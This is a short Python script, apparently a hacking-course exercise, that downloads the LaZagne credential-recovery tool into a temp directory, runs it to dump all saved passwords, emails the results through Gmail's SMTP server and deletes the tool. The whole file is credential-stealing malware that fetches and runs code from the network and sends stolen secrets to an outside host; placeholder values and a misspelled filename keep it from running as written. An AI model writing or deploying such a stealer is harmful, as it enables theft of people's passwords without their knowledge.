#!/usr/bin/env python

import subprocess
import smtplib
import requests
import re
import os
import tempfile


def download(url):
    req = requests.get(url)
    name = url.split("/")[-1]
    with open(name, "wb") as file:
        file.write(req.content)


def send_email(email, password, msg):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, msg)
    server.quit()


tempdir = tempfile.gettempdir()
os.chdir(tempdir)
download("download laZagne.exe")
result = subprocess.check_output("aZagne.exe all", shell=True)
send_email("email", "pass", result)
os.remove("laZagne.exe")
